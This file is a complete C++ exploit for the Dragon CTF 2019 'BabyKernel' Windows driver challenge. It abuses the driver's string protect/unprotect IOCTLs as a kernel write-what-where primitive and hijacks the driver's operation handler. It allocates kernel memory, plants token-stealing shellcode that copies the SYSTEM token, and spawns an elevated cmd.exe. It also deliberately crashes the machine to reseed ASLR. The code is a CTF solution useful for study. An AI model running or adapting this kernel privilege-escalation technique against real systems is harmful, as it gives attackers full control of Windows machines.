// Filename:         Exploit.cpp
// Author:           Mateusz Jurczyk
// Task:             BabyKernel
// Competition:      Dragon CTF 2019
// Category:         Software exploitation
// Scoring:          460 pts (medium)
// Number of solves: 2 out of 14 teams

#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <cstdio>
#include <string>
#include "SecureDrv.h"

#pragma comment(lib, "ntdll")

#define SystemModuleInformation ((SYSTEM_INFORMATION_CLASS)11)

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

BOOLEAN GetKernelModuleBase(CONST CHAR *Name, ULONG_PTR *lpBaseAddress) {
  PRTL_PROCESS_MODULES ModuleInformation = NULL;
  ULONG InformationSize = 16;
  NTSTATUS NtStatus;

  do {
    InformationSize *= 2;

    ModuleInformation = (PRTL_PROCESS_MODULES)realloc(ModuleInformation, InformationSize);
    memset(ModuleInformation, 0, InformationSize);

    NtStatus = NtQuerySystemInformation(SystemModuleInformation,
      ModuleInformation,
      InformationSize,
      NULL);
  } while (NtStatus == STATUS_INFO_LENGTH_MISMATCH);

  if (!NT_SUCCESS(NtStatus)) {
    return FALSE;
  }

  BOOL Success = FALSE;
  for (UINT i = 0; i < ModuleInformation->NumberOfModules; i++) {
    CONST PRTL_PROCESS_MODULE_INFORMATION Module = &ModuleInformation->Modules[i];
    CONST USHORT OffsetToFileName = Module->OffsetToFileName;

    if (!strcmp((const char *)&Module->FullPathName[OffsetToFileName], Name)) {
      *lpBaseAddress = (ULONG_PTR)ModuleInformation->Modules[i].ImageBase;
      Success = TRUE;
      break;
    }
  }

  free(ModuleInformation);
  return Success;
}

BOOL ProtectString(HANDLE hDevice, PBYTE Buffer, ULONG BufferSize) {
  BYTE WriteableBuffer[4096];

  if (BufferSize > sizeof(Buffer)) {
    return FALSE;
  }

  memcpy(WriteableBuffer, Buffer, BufferSize);

  DWORD BytesReturned;
  DeviceIoControl(hDevice, IOCTL_MODE_PROTECT, NULL, 0, NULL, 0, &BytesReturned, NULL);
  return DeviceIoControl(hDevice, IOCTL_PERFORM_OPERATION, WriteableBuffer, BufferSize, NULL, 0, &BytesReturned, NULL);
}

BOOL UnprotectString(HANDLE hDevice, CONST CHAR *Buffer, ULONG BufferSize) {
  DWORD BytesReturned;
  DeviceIoControl(hDevice, IOCTL_MODE_UNPROTECT, NULL, 0, NULL, 0, &BytesReturned, NULL);
  return DeviceIoControl(hDevice, IOCTL_PERFORM_OPERATION, (PVOID)Buffer, BufferSize, NULL, 0, &BytesReturned, NULL);
}

BOOL WriteStringToAddress(HANDLE hDevice, ULONG_PTR Where, CONST CHAR *String) {
  if (!ProtectString(hDevice, (PBYTE)String, strlen(String))) {
    return FALSE;
  }

  UnprotectString(hDevice, (CONST CHAR *)Where, ULONG_MAX);
  return TRUE;
}

BOOL WriteDataToAddress(HANDLE hDevice, ULONG_PTR Where, std::string String) {
  size_t offset = 0;
  size_t nul_pos = String.find('\0');

  while (nul_pos != std::string::npos) {
    if (!WriteStringToAddress(hDevice, Where + offset, String.substr(offset, nul_pos - offset).c_str())) {
      return FALSE;
    }

    offset = nul_pos + 1;
    nul_pos = String.find('\0', offset);
  }

  if (!WriteStringToAddress(hDevice, Where + offset, String.substr(offset).c_str())) {
    return FALSE;
  }

  return TRUE;
}

BOOL WriteWhatWhere8(HANDLE hDevice, ULONG_PTR Where, ULONG_PTR What) {
  std::string container((CONST CHAR *)&What, 8);
  return WriteDataToAddress(hDevice, Where, container);
}

VOID CallGadget(HANDLE hDevice, ULONG_PTR Param1, ULONG Param2, PULONG_PTR Result) {
  DWORD BytesReturned;
  DeviceIoControl(hDevice, IOCTL_PERFORM_OPERATION, (PVOID)Param1, Param2, Result, sizeof(ULONG_PTR), &BytesReturned, NULL);
}

VOID SpawnAndWaitForShell() {
  STARTUPINFO si;
  PROCESS_INFORMATION pi;

  RtlZeroMemory(&si, sizeof(si));
  RtlZeroMemory(&pi, sizeof(pi));
  si.cb = sizeof(si);

  if (CreateProcess(L"C:\\Windows\\system32\\cmd.exe",
    NULL, NULL, NULL, FALSE, 0, NULL, L"C:\\", &si, &pi)) {
    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
  }
}

BOOL ContainsZeros(ULONG_PTR Value) {
  for (int i = 0; i < 8; i++) {
    if (((Value >> (i * 8)) & 0xff) == 0) {
      return TRUE;
    }
  }

  return FALSE;
}

int main() {
  printf("---===[ Baby Kernel Exploit, Dragon CTF 2019 ]===---\n");

  ULONG_PTR Nt_Addr = 0, Driver_Addr;
  if (!GetKernelModuleBase("ntoskrnl.exe", &Nt_Addr) ||
    !GetKernelModuleBase("SecureDrv.sys", &Driver_Addr)) {
    printf("[-] Unable to acquire kernel module address information.\n");
    return 1;
  }

  printf("[+] ntoskrnl: %llx, driver: %llx\n", Nt_Addr, Driver_Addr);

  HANDLE hDevice = CreateFile(L"\\\\.\\SecureStorage", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Unable to access the SecureStorage driver\n");
    return 1;
  }

#define OperationHandler_OFFSET         0x4050
#define ExAllocatePoolWithTag_OFFSET  0x348030
#define PsInitialSystemProcess_OFFSET 0x5412E0

  if (ContainsZeros(Driver_Addr + OperationHandler_OFFSET) ||
      ContainsZeros(Nt_Addr + ExAllocatePoolWithTag_OFFSET) ||
      ContainsZeros(Nt_Addr + PsInitialSystemProcess_OFFSET)) {
    printf("[-] One of the %llx, %llx, %llx addresses contains zeros.\n",
           Driver_Addr + OperationHandler_OFFSET,
           Nt_Addr + ExAllocatePoolWithTag_OFFSET,
           Nt_Addr + PsInitialSystemProcess_OFFSET);

    printf("[ ] Press ENTER to crash the machine and reseed ASLR: ");
    getchar();

    WriteWhatWhere8(hDevice, 0xFFFFFFFFDEADBEEF, 0x4141414141414141LL);
    
    printf("[-] You shouldn't see this.. aborting.\n");

    return 1;
  }

  if (!WriteWhatWhere8(hDevice, Driver_Addr + OperationHandler_OFFSET, Nt_Addr + ExAllocatePoolWithTag_OFFSET)) {
    printf("[-] Write-what-where #1 failed\n");
    return 1;
  }
  else {
    printf("[+] Operation handler overwritten with nt!ExAllocatePoolWithTag\n");
  }

  ULONG_PTR ShellcodeAddr = 0;

  int i = 0;
  do {
    CallGadget(hDevice, 0 /* NonPagedPool */, 0x1000, &ShellcodeAddr);
    ShellcodeAddr++;

    printf("[ ] Allocated candidate region: %llx\n", ShellcodeAddr);
  } while (ContainsZeros(ShellcodeAddr) && i < 16);

  if (i == 16) {
    printf("[-] Unable to allocate an RWX kernel region without zeros in the address\n");
    return 1;
  }

  printf("[+] Allocated shellcode address: %llx\n", ShellcodeAddr);

  // The shellcode takes the address of a pointer to a process object in the kernel in the first
  // argument (RCX), and copies its security token to the current process.
  //
  // 00000000  65488B0425880100  mov rax, [gs:KPCR.Prcb.CurrentThread]
  // -00
  // 00000009  488B80B8000000    mov rax, [rax + ETHREAD.Tcb.ApcState.Process]
  // 00000010  488B09            mov rcx, [rcx]
  // 00000013  488B8958030000    mov rcx, [rcx + EPROCESS.Token]
  // 0000001A  48898858030000    mov [rax + EPROCESS.Token], rcx
  // 00000021  C3                ret
  CONST BYTE ShellcodeBytes[] = "\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00"
                                "\x48\x8B\x09\x48\x8B\x89\x58\x03\x00\x00\x48\x89\x88\x58\x03\x00"
                                "\x00\xC3";
  std::string Shellcode((PCHAR)ShellcodeBytes, sizeof(ShellcodeBytes));

  if (!WriteDataToAddress(hDevice, ShellcodeAddr, Shellcode)) {
    printf("[-] Write-what-where #2 failed\n");
    return 1;
  }

  printf("[+] Wrote shellcode bytes to the allocated address\n");

  if (!WriteWhatWhere8(hDevice, Driver_Addr + OperationHandler_OFFSET, ShellcodeAddr)) {
    printf("[-] Write-what-where #3 failed\n");
    return 1;
  }

  printf("[+] Operation handler overwritten with shellcode address, invoking the payload...\n");
  CallGadget(hDevice, Nt_Addr + PsInitialSystemProcess_OFFSET, 0, NULL);

  printf("[+] Done, spawning an elevated command prompt:\n");
  SpawnAndWaitForShell();

  CloseHandle(hDevice);

  return 0;
}
